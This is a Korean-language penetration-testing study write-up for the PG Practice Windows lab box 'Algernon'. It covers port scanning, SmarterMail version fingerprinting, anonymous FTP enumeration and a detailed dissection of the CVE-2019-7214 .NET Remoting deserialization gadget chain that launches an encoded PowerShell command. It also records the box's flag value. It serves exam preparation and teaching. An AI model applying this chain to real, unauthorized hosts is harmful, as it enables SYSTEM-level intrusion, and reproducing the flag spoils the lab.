---
tags:
  - type/machine
  - platform/pg
  - os/windows
  - status/solved
  - tech/web/deserialization
  - tech/svc/ftp
  - tech/payload/revshell
type: machine
platform: pg
os: windows
ip: 192.168.248.65
ports: [21, 80, 135, 139, 445, 9998, 17001]
services: [distinct32, ftp, http, microsoft-ds, msrpc, netbios-ssn, remoting]
cves: [CVE-2019-7214]
status: solved
manual_tags: true
tech_count: 3
---
> [!info] PG Practice — Algernon · Windows · 단일 취약점 원샷 박스
> 타겟 192.168.248.65 (`algernon`) · OS Microsoft Windows 10 Pro, Build 18363 x64, WORKGROUP · 공격자 tun0 `192.168.45.207`
> **플래그 1개** — `proof.txt` = `6126cdddc1ed43d92e8a34f71ecda278` (`C:\Users\Administrator\Desktop\`) · `local.txt`는 존재하지 않음
> **경로 요약** 9998 SmarterMail 웹 UI에서 빌드 6919 확정 → 17001/tcp .NET Remoting 엔드포인트 → CVE-2019-7214 .NET `BinaryFormatter` 역직렬화 → EDB 49216 → `MailService`가 LocalSystem으로 구동되므로 **셸이 곧 SYSTEM**. 권한상승 단계 없음.

---

## 0. 이 박스에서 배우는 것

- **.NET 역직렬화가 왜 RCE가 되는가** — `BinaryFormatter`, 가젯 체인, `DelegateSerializationHolder`가 실제로 무슨 일을 하는지. 페이로드를 base64로 복붙하는 수준을 벗어남
- **.NET Remoting(17001/tcp)이라는 잊힌 공격면** — 웹 포트가 아니라 바이너리 RPC 포트가 진짜 입구
- **"버전은 독립 근거 2개 이상"** — 브리핑에 적힌 빌드 번호가 틀림. 런타임 렌더·정적 자산 경로·디스크 바이너리 3중으로 뒤집음
- **익스플로잇 제목의 버전은 타겟 버전이 아님** — `SmarterMail Build 6985 - RCE`의 6985는 취약 상한선이지 이 박스의 빌드가 아님
- **서비스 실행 계정이 곧 권한상승 유무를 결정** — `Win32_Service.StartName`이 `LocalSystem`이면 4장이 통째로 사라짐
- **Metasploit 카드를 아끼는 판단** — 동일 모듈이 존재하는데도 EDB 스크립트를 쓴 이유
- **성공 신호가 없는 익스플로잇을 다루는 법** — 이 스크립트는 아무것도 출력하지 않고 `EXIT=0`으로 끝남. 리스너만이 진실을 말함

> [!tip] 시험 출제 가능성
> 요소별로 갈림.
>
> | 요소 | 시험 출제 가능성 | 이유 |
> |---|---|---|
> | 비표준 고번호 포트의 미확인 서비스 | 매우 높음 | 시험 박스는 `-p-` 없이는 못 푸는 구성을 즐김. 17001 같은 포트를 "unknown"이라고 넘기는 순간 끝 |
> | 버전 → 공개 익스플로잇 → 원샷 | 매우 높음 | OSCP 시험의 표준 foothold 패턴임. 어려운 것은 익스플로잇이 아니라 정확한 버전 판정 |
> | .NET 역직렬화 자체 | 중간 | CVE-2019-7214가 그대로 나올 가능성은 낮음. 그러나 Telerik UI 역직렬화, ViewState MAC 미검증, Java `readObject` 등 같은 클래스가 반복 출제됨 |
> | 서비스 계정이 SYSTEM이라 권한상승 불요 | 중간 | Windows 서비스를 익스플로잇해 셸을 잡으면 흔히 생김. 셸을 잡자마자 `whoami`부터 치는 이유 |
>
> 변형의 모습 — SmarterMail 대신 Telerik/Jenkins/Tomcat, 17001 대신 8080/9000, `BinaryFormatter` 대신 Java `ObjectInputStream`. **"신뢰 없는 바이트를 객체로 되돌리면 코드가 실행된다"는 원리는 동일함.**

### 이 박스가 값진 이유

익스플로잇 자체는 5분이면 끝남. **값은 그 앞뒤에 있음** — 브리핑에 적힌 빌드 번호가 틀렸다는 것을 어떻게 잡았는가, 서로 다른 두 포트(9998/17001) 중 무엇이 진짜 대상인가, 그리고 리스너 인프라를 잘못 만들어 첫 발사를 날렸을 때 어떻게 그것을 알아채는가.
6장이 이 노트의 절반인 이유임.

---

## 1. 정찰

### 1-1. 빠른 스캔 — 손이 먼저 나가는 포트부터

전체 스캔은 3분 초과 소요. 그동안 놀 수 없으므로 **의심 포트만 먼저** 때림.

```bash
┌──(kali㉿kali)-[~/PG/Algernon]
└─$ sudo nmap --privileged -Pn -n -p 80,443,9998,17001,25,110,143,587,3389,135,445 -sS -T4 -oN nmap_quick.log 192.168.248.65
Nmap scan report for 192.168.248.65
Host is up (0.26s latency).

PORT      STATE  SERVICE
25/tcp    closed smtp
80/tcp    open   http
110/tcp   closed pop3
135/tcp   open   msrpc
143/tcp   closed imap
443/tcp   closed https
445/tcp   open   microsoft-ds
587/tcp   closed submission
3389/tcp  closed ms-wbt-server
9998/tcp  open   distinct32
17001/tcp open   unknown

# Nmap done at Thu Aug 20 10:59:01 2026 -- 1 IP address (1 host up) scanned in 1.32 seconds
```

**1.32초**. 이 시점에서 이미 두 가지를 앎.

1. **9998과 17001이 둘 다 열림.** 사전 정보(브리핑)는 9998을, 개인 노트는 17001을 지목. 둘 다 맞음 — 역할이 다를 뿐. 이 충돌을 여기서 해소하지 않고 넘어가면 6장의 함정에 빠짐
2. **25/110/143/587이 전부 closed.** 메일 서버 제품이 도는데 SMTP·POP3·IMAP이 닫혀 있음. 즉 이 박스에서 SmarterMail은 "메일을 주고받는 서버"로 노출된 것이 아니라 웹 UI + 관리 채널만 열림. 메일 프로토콜 쪽 공격면은 없다고 판단하고 버림

> [!tip] 시험 반사 — "제품은 있는데 표준 포트가 닫혀 있다"
> 그 제품의 **비표준 관리/RPC 채널**을 찾아라. 메일 서버인데 25가 닫혔다면 관리 인터페이스가 진짜 표적.

### 1-2. 전수 스캔 — `-p-`가 아니었으면 17001을 놓쳤음

```bash
┌──(kali㉿kali)-[~/PG/Algernon]
└─$ sudo nmap -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.248.65
Nmap scan report for 192.168.248.65
Host is up (0.084s latency).
Not shown: 65521 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 04-29-20  10:31PM       <DIR>          ImapRetrieval
| 08-19-26  06:57PM       <DIR>          Logs
| 04-29-20  10:31PM       <DIR>          PopRetrieval
|_04-29-20  10:32PM       <DIR>          Spool
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
9998/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-IIS/10.0
| uptime-agent-info: HTTP/1.1 400 Bad Request\x0D
| Content-Type: text/html; charset=us-ascii\x0D
| Server: Microsoft-HTTPAPI/2.0\x0D
| Date: Thu, 20 Aug 2026 02:05:23 GMT\x0D
| Connection: close\x0D
| Content-Length: 326\x0D
| \x0D
| <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN""http://www.w3.org/TR/html4/strict.dtd">\x0D
| <HTML><HEAD><TITLE>Bad Request</TITLE>\x0D
| <META HTTP-EQUIV="Content-Type" Content="text/html; charset=us-ascii"></HEAD>\x0D
| <BODY><h2>Bad Request - Invalid Verb</h2>\x0D
| <hr><p>HTTP Error 400. The request verb is invalid.</p>\x0D
|_</BODY></HTML>\x0D
| http-title: Site doesn't have a title (text/html; charset=utf-8).
|_Requested resource was /interface/root
17001/tcp open  remoting      MS .NET Remoting services
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-08-20T02:05:27
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required

# Nmap done at Thu Aug 20 11:05:40 2026 -- 1 IP address (1 host up) scanned in 208.01 seconds
```

**플래그 해설**

| 플래그 | 역할 | 빼면 어떻게 되는가 |
|---|---|---|
| `-p-` | 65535 포트 전수 | 기본 top-1000에는 9998도 17001도 없음. 이 박스는 `-p-` 없이는 아예 풀리지 않음 |
| `-sCV` | 기본 NSE 스크립트 + 버전 탐지 | `ftp-anon`(익명 FTP 허용)과 `17001/tcp open remoting MS .NET Remoting services` 판정이 여기서 나옴. `-sS`만 돌리면 17001은 그냥 `unknown` |
| `-Pn` | ping 생략 | Windows 방화벽은 ICMP를 흔히 막음. 빼면 "host down"으로 오판 |
| `-A` | OS 탐지 + traceroute + 스크립트 | OS 지문은 "No exact OS matches"로 실패. `-A`가 항상 답을 주지는 않음 — 실제 OS는 셸을 잡은 뒤 `systeminfo`로 확정 |
| `--min-rate 5000` | 초당 최소 5000패킷 | 208초로 단축. 대신 오탐 위험이 생김 → 다음 절에서 교차검증 |

**이 출력에서 반드시 읽어야 할 줄 3개**

1. `Not shown: 65521 closed tcp ports (reset)` — **filtered가 아니라 closed(RST).** 인바운드 방화벽이 없다는 뜻. [[Squid]]의 `65529 filtered`와 정반대. 필터가 없으므로 포트 상태를 그대로 믿어도 됨
2. `17001/tcp open remoting MS .NET Remoting services` — nmap이 **이름까지 붙여줌.** 이걸 보고도 그냥 지나치면 안 됨. .NET Remoting은 2010년대 초반에 폐기 권고된 레거시 RPC고, 역직렬화 공격의 고전적 표적임
3. `ftp-anon: Anonymous FTP login allowed` + `ImapRetrieval / Logs / PopRetrieval / Spool` — 이 디렉터리 이름 4개는 **SmarterMail 데이터 디렉터리의 시그니처**. FTP 루트가 메일 스풀에 붙어 있음

### 1-3. 저레이트 교차검증 — `--min-rate`를 썼으면 반드시 할 것

`--min-rate 5000`은 패킷을 잃을 수 있음. **정확히는 "없는 포트를 만들어내지는 않지만, 있는 포트를 놓칠 수 있다."** 그래서 느린 SYN 스캔으로 다시 돌림.

```bash
┌──(kali㉿kali)-[~/PG/Algernon]
└─$ sudo nmap -sS -p- -Pn -n --max-rate 500 -T3 -oN nmap_lowrate_crosscheck.log 192.168.248.65
Nmap scan report for 192.168.248.65
Host is up (0.086s latency).
Not shown: 65521 closed tcp ports (reset)
PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5040/tcp  open  unknown
9998/tcp  open  distinct32
17001/tcp open  unknown
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown

# Nmap done at Thu Aug 20 11:08:08 2026 -- 1 IP address (1 host up) scanned in 165.81 seconds
```

**14개 포트가 고레이트 결과와 일치 — 오탐·누락 없음.** 이제 포트 목록을 확정 사실로 취급해도 됨.

> [!warning] `9998 distinct32`에 속지 마라
> 저레이트 스캔은 `-sS`뿐이라 서비스 이름을 **`/usr/share/nmap/nmap-services` 표에서 포트 번호로 찍음.** `distinct32`는 IANA 등록명일 뿐 실제로 돌고 있는 것과 무관. 같은 이유로 17001이 `unknown`으로 나옴.
> **서비스 이름은 `-sV` 결과만 믿을 것.** 포트 번호 → 서비스 추측은 출발점이지 결론이 아님.

### 1-4. 서비스 식별 — 9998과 17001의 역할 분리

여기서 사전 정보의 충돌을 끝냄.

| 포트 | 실제 정체 | 근거 | 익스플로잇 대상인가 |
|---|---|---|---|
| 80 | IIS 10.0 기본 사이트 | `http-title: IIS Windows` (기본 시작 페이지) | ✗ — 빈 껍데기 |
| 9998 | SmarterMail 웹 인터페이스 (IIS 호스팅) | `Requested resource was /interface/root`, `Microsoft-HTTPAPI/2.0` | ✗ — 버전 판정용 정보원으로는 결정적 |
| 17001 | .NET Remoting 서비스 채널 | nmap `-sV` 가 `remoting MS .NET Remoting services` 로 판정 | ✓ 여기가 입구 |

> [!danger] 브리핑이 "9998을 공격하라"고 했지만 그건 틀림
> 9998은 HTTP. CVE-2019-7214 익스플로잇은 HTTP를 말하지 않음 — **`.NET` 매직 4바이트로 시작하는 원시 TCP 프레임**을 보냄. 9998로 쏘면 IIS가 `400 Bad Request - Invalid Verb`를 반환(위 nmap 출력의 `uptime-agent-info` 블록이 정확히 그 응답).
> **9998의 역할은 "무엇이 돌고 있고 몇 번 빌드인가"를 알려주는 것**이고, 17001의 역할은 "그것을 어떻게 죽이는가". 두 포트를 혼동하면 정상 동작하는 익스플로잇을 "안 먹힌다"고 버리게 됨.

### 1-5. 버전 판정 — 독립 근거 3개로 브리핑을 뒤집음

9998에 붙으면 SmarterMail 로그인 화면이 나옴.

![[PG-Algernon-smartermail-login.png]]

화면 자체는 버전을 말해주지 않음(`Welcome to SmarterMail` 뿐). **버전은 소스와 자산 경로에 있음.**

**근거 ① — 런타임에 렌더된 JS 변수**

```bash
┌──(kali㉿kali)-[~/PG/Algernon]
└─$ curl -s http://192.168.248.65:9998/interface/root | grep -o 'stProductBuild[^;]*'
stProductBuild = "6919 (Dec 11, 2018)"
```

**근거 ② — 정적 자산의 캐시버스팅 경로**

```bash
┌──(kali㉿kali)-[~/PG/Algernon]
└─$ curl -s http://192.168.248.65:9998/interface/root | grep -o 'login-v-[0-9.]*[^"]*'
login-v-100.0.6919.30414.8d65fc3f1d47d00.min.css
```

**근거 ③ — 디스크 바이너리의 버전 리소스** (셸을 잡은 뒤 사후 확인)

```powershell
PS C:\Windows\system32> (Get-Item "C:\Program Files (x86)\SmarterTools\SmarterMail\Service\MailService.exe").VersionInfo | Format-List ProductVersion,FileVersion

ProductVersion : 100.0.6919.30415
FileVersion    : 100.0.6919.30415
```

**결론 — 실제 빌드는 6919.** 브리핑에 적혀 있던 "build 6985"는 틀림.

> [!danger] 익스플로잇 제목의 숫자를 타겟 버전으로 착각하지 마라
> EDB 49216의 제목은 `SmarterMail Build 6985 - Remote Code Execution`이고 본문 기재는 다음과 같음:
> ```
> # SmarterMail before build 6985 provides a .NET remoting endpoint
> # which is vulnerable to a .NET deserialisation attack.
> ```
> **6985는 "이 빌드 미만이 취약하다"는 상한선**임. 브리핑을 쓴 사람이 익스플로잇 제목을 그대로 타겟 빌드로 옮겨 적은 것.
> 실전에서 이게 왜 위험한가 — 6985라고 믿으면 "패치된 최신 빌드인데 왜 취약하지?" 하고 혼란에 빠지거나, 반대로 6919를 보고 "6985가 아니네, 다른 CVE인가?" 하며 시간을 태움.
> **버전 판정은 항상 독립 근거 2개 이상.** ①런타임 렌더 ②정적 자산 경로는 서로 다른 코드 경로에서 나온 값이므로 독립 근거로 인정됨. 이 패턴은 [[Hub]]·[[Levram]]·[[RubyDome]]·[[Astronaut]]·[[Squid]]에서도 반복됨.

참고로 ①(6919.30415 계열)과 ②(6919.30414)의 **마지막 자리가 1 다름.** 웹 자산은 웹 프로젝트 빌드, 바이너리는 서비스 프로젝트 빌드라 리비전이 갈리는 것 `[가정]`. 판정에 쓰이는 빌드 번호 6919는 동일하므로 결론에는 영향이 없음.

### 1-6. 디렉터리 열거 — 그리고 스캐너 함정

**80번 — 아무것도 없음**

```
/aspnet_client        (Status: 301) [Size: 159] [--> http://192.168.248.65/aspnet_client/]
```

`aspnet_client`는 **IIS + ASP.NET을 설치하면 자동 생성되는 빈 디렉터리**. 발견물이 아니라 "ASP.NET이 깔려 있다"는 지문일 뿐. 80은 여기서 버림.

**9998번 — SmarterMail의 라우트 구조**

```
/api                  (Status: 302) [Size: 132] [--> /interface/root]
/aux                  (Status: 302) [Size: 162] [--> /Interface/errors/404.html?aspxerrorpath=/aux]
/com1                 (Status: 302) [Size: 163] [--> /Interface/errors/404.html?aspxerrorpath=/com1]
/com2                 (Status: 302) [Size: 163] [--> /Interface/errors/404.html?aspxerrorpath=/com2]
/com3                 (Status: 302) [Size: 163] [--> /Interface/errors/404.html?aspxerrorpath=/com3]
/con                  (Status: 302) [Size: 162] [--> /Interface/errors/404.html?aspxerrorpath=/con]
/download             (Status: 500) [Size: 36]
/Download             (Status: 500) [Size: 36]
/favicon.ico          (Status: 200) [Size: 32038]
/fonts                (Status: 301) [Size: 156] [--> http://192.168.248.65:9998/fonts/]
/interface            (Status: 301) [Size: 160] [--> http://192.168.248.65:9998/interface/]
/lpt1                 (Status: 302) [Size: 163] [--> /Interface/errors/404.html?aspxerrorpath=/lpt1]
/lpt2                 (Status: 302) [Size: 163] [--> /Interface/errors/404.html?aspxerrorpath=/lpt2]
/nul                  (Status: 302) [Size: 162] [--> /Interface/errors/404.html?aspxerrorpath=/nul]
/prn                  (Status: 302) [Size: 162] [--> /Interface/errors/404.html?aspxerrorpath=/prn]
/reports              (Status: 301) [Size: 158] [--> http://192.168.248.65:9998/reports/]
/scripts              (Status: 301) [Size: 158] [--> http://192.168.248.65:9998/Scripts/]
/Scripts              (Status: 301) [Size: 158] [--> http://192.168.248.65:9998/Scripts/]
/services             (Status: 301) [Size: 159] [--> http://192.168.248.65:9998/services/]
/Services             (Status: 301) [Size: 159] [--> http://192.168.248.65:9998/Services/]
/views                (Status: 200) [Size: 0]
```

> [!warning] 스캐너 함정 ① — DOS 디바이스명 무더기(`aux` `con` `prn` `nul` `com1~3` `lpt1~2`)
> 이 8개는 **발견물이 아님.** Windows가 예약한 레거시 디바이스 이름이고, ASP.NET이 이를 처리하다 일관되게 `302 → 404 핸들러`를 뱉음.
> 판별법은 하나 — **리다이렉트 목적지를 봐라.** 전부 `/Interface/errors/404.html?aspxerrorpath=...`. 404를 302로 포장한 것.
> 일반화 — **"200/301/302"라는 코드가 아니라 "본문/목적지가 다른가"로 판단할 것.** [[Crane]]·[[RubyDome]]·[[Astronaut]]·[[Exghost]]·[[Hawat]]·[[Squid]]에서 누적 중인 "응답이 성공을 뜻하지 않는다" 패턴의 또 하나의 사례.

> [!warning] 스캐너 함정 ② — 대소문자 중복(`/scripts`와 `/Scripts`, `/services`와 `/Services`)
> Windows 파일시스템은 **대소문자를 구분하지 않음.** `/scripts`가 `/Scripts/`로 리다이렉트되는 것에서 정규 표기가 `Scripts`임을 알 수 있음. 두 줄이 아니라 한 개의 디렉터리.
> 리눅스 타겟에서 이런 중복이 나오면 **정말로 두 디렉터리**일 수 있음 — OS에 따라 해석이 갈림.

`/views`는 `200`이지만 **Size 0**. 라우트는 존재하나 인덱스가 비어 있다는 뜻이므로 파고들 가치 없음.

**결론 — 웹 열거에서 얻은 것은 "SmarterMail이 맞다"와 "빌드 6919"뿐.** 웹 UI에 자격증명이 없고 로그인도 불가. 입구는 웹이 아님.

### 1-7. 익명 FTP — 이번엔 안 썼지만 기록해 둠

```
21/tcp open ftp Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 04-29-20  10:31PM       <DIR>          ImapRetrieval
| 08-19-26  06:57PM       <DIR>          Logs
| 04-29-20  10:31PM       <DIR>          PopRetrieval
|_04-29-20  10:32PM       <DIR>          Spool
```

디렉터리 4개가 전부 **SmarterMail 데이터 디렉터리**. 즉 익명 FTP가 메일 스풀에 그대로 붙어 있음.

```bash
# 이번 풀이에서는 사용하지 않았다. 대안 경로로만 기록한다.
ftp 192.168.248.65        # user: anonymous / pass: (아무거나)
# 또는 재귀 미러링
wget -m --no-passive-ftp ftp://anonymous:anonymous@192.168.248.65/
```

**왜 대안 경로인가**

| 디렉터리 | 노려볼 것 |
|---|---|
| `Spool` | 평문 `.eml` 메일 본문. 자격증명·초대 링크·내부 호스트명이 메일에 적혀 있는 경우가 흔함 |
| `Logs` | SmarterMail 로그. 로그인 시도에 계정명이 남음 → 사용자 열거. `08-19-26` 타임스탬프로 보아 활성 로그 |
| `ImapRetrieval` / `PopRetrieval` | 외부 메일 계정을 끌어오는 설정. 저장된 외부 계정 자격증명이 있을 수 있음 |

> [!tip] 시험 반사 — 익명 FTP를 보면
> `ftp-anon`이 뜨면 **무조건 재귀로 다 받아라.** 크기가 작으면 몇 초. 시험장에서 "나중에 봐야지" 하고 넘긴 익명 FTP가 유일한 자격증명 출처인 경우가 실제로 있음.
> 다만 **이 박스에서는 17001 경로가 압도적으로 빠름.** FTP는 17001이 실패했을 때의 2순위.

---

## 2. 취약점 분석 — CVE-2019-7214

### 이 장의 목표

"CVE-2019-7214를 EDB 49216으로 쏘면 SYSTEM" 이라는 한 줄은 **시험에서 쓸모없음.** 시험에 이 CVE는 안 나옴.
나오는 것은 **"신뢰할 수 없는 바이트를 객체로 되돌리는 코드"** 라는 클래스임. 그래서 이 장은 페이로드의 마지막 바이트까지 뜯음.

### 2-1. 배경 ① — 직렬화와 역직렬화

**직렬화(serialization)**: 메모리 속 객체를 전송·저장 가능한 바이트열로 납작하게 만드는 것.
**역직렬화(deserialization)**: 그 바이트열을 다시 객체로 부풀리는 것.

여기까지는 무해해 보임. 함정은 **역직렬화가 "데이터를 읽는 행위"가 아니라 "코드를 실행하는 행위"** 라는 데 있음.

객체를 복원하려면 런타임은 반드시 다음을 해야 함.

1. 바이트열에 적힌 타입 이름을 읽음 (`System.Collections.Generic.SortedSet\`1[[System.String, ...]]`)
2. 그 타입을 어셈블리에서 로드
3. 인스턴스를 만들고 필드를 채움
4. **복원 완료 콜백 호출** — `OnDeserialization()`, `ISerializable` 생성자, `IDeserializationCallback` 등

**4번이 전부.** 타입 이름을 공격자가 정한다는 것은 "어떤 클래스의 복원 콜백을 실행시킬지 공격자가 고른다"는 뜻임. 그 콜백 안에서 우연히 위험한 일(프로세스 실행, 파일 쓰기, 델리게이트 호출)을 하는 클래스를 찾아 엮으면 RCE가 됨.

#### 가젯(gadget)과 가젯 체인(gadget chain)

**가젯**은 "역직렬화 도중 자동으로 실행되는, 이미 애플리케이션에 존재하는 코드 조각"임. ROP 체인의 가젯과 개념이 같음 — 새 코드를 주입하는 것이 아니라 이미 있는 코드를 이어 붙임.
그래서 이 공격은 **셸코드도, 메모리 손상도, ASLR/DEP 우회도 필요 없음.** 순수하게 "타입 시스템을 남용"함.
가젯 체인은 표준 라이브러리(`mscorlib`, `System`)에만 있어도 성립하므로 **애플리케이션이 무엇이든 재사용됨.** `ysoserial.net`이 존재하는 이유임.

### 2-2. 배경 ② — `BinaryFormatter`가 왜 특별히 위험한가

.NET에는 직렬화기가 여럿 있음. 위험도는 **"타입 이름을 스트림에서 읽는가"**로 갈림.

| 직렬화기 | 타입을 어디서 정하는가 | 위험도 |
|---|---|---|
| `XmlSerializer` | 호출자가 미리 지정(`new XmlSerializer(typeof(Foo))`) | 낮음 |
| `DataContractSerializer` | 호출자 지정 + `KnownTypes` 화이트리스트 | 낮음 |
| `JavaScriptSerializer` (기본) | 호출자 지정 | 낮음 |
| `BinaryFormatter` | 스트림 안에 적힌 대로 | 치명적 |
| `NetDataContractSerializer` / `LosFormatter` / `ObjectStateFormatter` | 스트림 안에 적힌 대로 | 치명적 |

`BinaryFormatter`는 **어떤 타입이든 스트림이 시키는 대로 복원함.** 화이트리스트도, 서명 검증도 없음. Microsoft는 결국 이 클래스를 .NET 9에서 완전히 제거했고 그 전에도 "안전하게 만들 수 없다"고 공식 문서에 못박음.

**핵심 문장 하나만 외운다면:**
> `BinaryFormatter.Deserialize()`에 신뢰할 수 없는 바이트를 넣는 것 = **그 바이트를 실행하는 것**과 동등. 예외 없음.

### 2-3. 배경 ③ — .NET Remoting은 무엇이고 왜 위험한가

**.NET Remoting**은 .NET Framework 1.0~2.0 시대의 원격 객체 호출 프레임워크. 자바의 RMI, 코바(CORBA)와 같은 계보.

동작 방식:
- 서버가 객체를 URI로 등록 (`tcp://host:17001/Servers`)
- 클라이언트는 로컬 객체처럼 메서드를 호출
- 프레임워크가 인자를 직렬화해서 TCP로 보내고, 서버가 역직렬화해서 실제 메서드를 호출

**여기서 문제가 자명해짐** — "인자를 역직렬화"하는 부분이 기본적으로 `BinaryFormatter`. 즉 .NET Remoting의 TCP 채널은 설계상 원격 역직렬화 엔드포인트.

| 왜 이게 그렇게 나쁜가 | 설명 |
|---|---|
| 인증이 선택 사항 | 기본 구성에서 TCP 채널은 누구나 연결해 객체를 보낼 수 있음 |
| `typeFilterLevel` 기본값 | `Low`면 델리게이트 계열이 차단되지만, `Full`로 올려놓는 애플리케이션이 흔함. SmarterMail이 그랬음 `[가정]` — 페이로드가 델리게이트 가젯을 쓰는데 성공했다는 사실이 근거 |
| **역직렬화가 메서드 호출 *전에* 일어남 | 인증 로직이 있어도 소용없음. 인자를 풀어야 인증 메서드를 호출할 수 있으므로, 인증 전에 이미 코드가 실행됨** |
| 폐기됐지만 살아 있음 | Microsoft는 2010년대 초 사용 중단을 권고했고 .NET Core는 아예 지원하지 않음. 그러나 레거시 제품에는 그대로 남아 있음 |

> [!danger] 시험 반사 — `nmap`이 `remoting` 이라고 하면
> **`.NET Remoting` 은 그 자체로 취약점 후보.** 포트를 보자마자 다음을 확인할 것:
> 1. 어떤 제품이 이 포트를 열었는가 (다른 포트의 웹 UI·배너에서 제품명 확보)
> 2. `searchsploit <제품명>` — 역직렬화 익스플로잇이 있는가
> 3. 없다면 `ysoserial.net` + `ExploitRemotingService` 조합을 직접 시도
>
> 같은 반사가 필요한 다른 신호들: 8009 AJP(Ghostcat), 1099 Java RMI, 4848 GlassFish, ViewState가 붙은 ASP.NET 폼, Telerik `Telerik.Web.UI.WebResource.axd`.

### 2-4. 왜 SmarterMail이 취약한가

NCC Group이 2019년에 보고한 내용을 이 박스의 관측과 합치면 다음과 같음.

- SmarterMail의 `MailService.exe`는 관리 도구와의 통신을 위해 17001/tcp에 .NET Remoting TCP 채널을 등록 — nmap의 `17001/tcp open remoting`이 직접 증거
- 이 채널은 네트워크 전체에 바인딩돼 있음(루프백 제한 없음). 4홉 떨어진 Kali에서 붙는다는 것이 증거
- 채널은 **인증 없이** 객체 그래프를 받아 `BinaryFormatter`로 역직렬화
- 서비스는 `LocalSystem`으로 돌기 때문에 실행된 코드도 SYSTEM 권한

마지막 항목은 셸을 잡은 뒤 직접 확인함.

```powershell
PS C:\Windows\system32> Get-CimInstance Win32_Service | Where-Object {$_.Name -like "*mail*"} | Select-Object Name,StartName,State,PathName | Format-List

Name      : MailService
StartName : LocalSystem
State     : Running
PathName  : "C:\Program Files (x86)\SmarterTools\SmarterMail\Service\MailService.exe"
```

**`StartName : LocalSystem` 한 줄이 이 박스의 4장(권한상승)을 통째로 삭제함.**

### 2-5. 가젯 체인 해부 — `SortedSet` + `DelegateSerializationHolder`

EDB 49216이 쓰는 체인은 `ysoserial.net`의 `TypeConfuseDelegate` 가젯. base64를 디코드하면 타입 이름들이 평문으로 보임.

```
System.Collections.Generic.SortedSet`1[[System.String, mscorlib, ...]]
System.Collections.Generic.ComparisonComparer`1[[System.String, mscorlib, ...]]
System.DelegateSerializationHolder
System.DelegateSerializationHolder+DelegateEntry
System.Reflection.MemberInfoSerializationHolder
System.Func`3[[System.String, ...],[System.String, ...],[System.Diagnostics.Process, System, ...]]
System.Diagnostics.Process
Start
System.Comparison`1[[System.String, mscorlib, ...]]
Compare
```

**체인이 도는 순서**

| 단계 | 무슨 일이 일어나는가 |
|---|---|
| 1 | `SortedSet<string>`이 복원됨. `SortedSet`은 `OnDeserialization`에서 원소를 다시 트리에 삽입하며 정렬함 |
| 2 | 삽입하려면 비교자를 호출해야 함. 비교자는 스트림이 정한 `ComparisonComparer<string>` — 즉 `Comparison<string>` 델리게이트를 감싼 래퍼 |
| 3 | 그 델리게이트는 `DelegateSerializationHolder`로 복원됨. 이 클래스가 이 공격의 심장 |
| 4 | `DelegateSerializationHolder`는 "델리게이트 타입 + 대상 메서드"를 받아 리플렉션으로 델리게이트를 재구성함. 여기서 시그니처 검증이 느슨함 |
| 5 | 스트림은 델리게이트 타입을 `Comparison<string>`(= `int (string, string)`)이라고 선언해 놓고, 실제 바인딩할 메서드로는 `Process.Start(string, string)` 를 지정 |
| 6 | 둘은 반환형이 다름(`int` vs `Process`). 그런데 x64에서 둘 다 레지스터 하나로 반환되므로 호출 규약이 호환됨. → 타입 혼동(type confusion) |
| 7 | 1단계의 트리 삽입이 비교자를 호출 → 실제로는 `Process.Start("cmd", "/c powershell.exe -encodedCommand ...")` 가 실행됨 |

#### `DelegateSerializationHolder`가 정확히 하는 일

델리게이트(C#의 함수 포인터)는 그 자체로 직렬화될 수 없음 — 메모리 주소이기 때문. 그래서 .NET은 델리게이트를 저장할 때 **"어느 타입의 어느 메서드인가"라는 메타데이터로 바꿔** `DelegateSerializationHolder`에 담고, 복원할 때 리플렉션으로 다시 묶음.
즉 이 클래스는 **"문자열로 적힌 메서드 이름을 실제 호출 가능한 함수로 바꿔주는 공장"**임. 공격자가 그 문자열을 정할 수 있으면 `mscorlib`/`System` 안의 아무 정적 메서드나 호출할 수 있게 됨.
`MemberInfoSerializationHolder`는 그 하위 부품으로, `System.Diagnostics.Process Start(System.String, System.String)` 라는 **시그니처 문자열로 메서드를 찾아줌.** 페이로드에 이 문자열이 두 번(`Signature`, `Signature2`) 들어 있는 이유임.

**인자 순서** — 디코드한 페이로드에서 배열 원소 두 개는 이 순서로 들어 있음.

```
ArraySingleObject id=4, length=2
  ├─ [0] BinaryObjectString id=6 : "/c powershell.exe -encodedCommand XXXX...(1360)"
  └─ [1] BinaryObjectString id=7 : "cmd"
```

원소 두 개짜리 트리를 재구성할 때 먼저 들어간 것이 루트가 되고, 두 번째 삽입에서 `Compare(신규, 기존)`이 호출됨 `[가정]`. 그러면 `Process.Start("cmd", "/c powershell.exe ...")`가 되어 파일명이 `cmd`, 인자가 `/c ...`로 올바르게 맞음. 실제로 셸이 떨어졌으므로 결과는 확정이나, **위 호출 순서 설명 자체는 코드 계측으로 확인하지 않았으므로 `[가정]`으로 둠.**

> [!tip] 일반화 — 역직렬화 취약점을 만났을 때 확인할 것
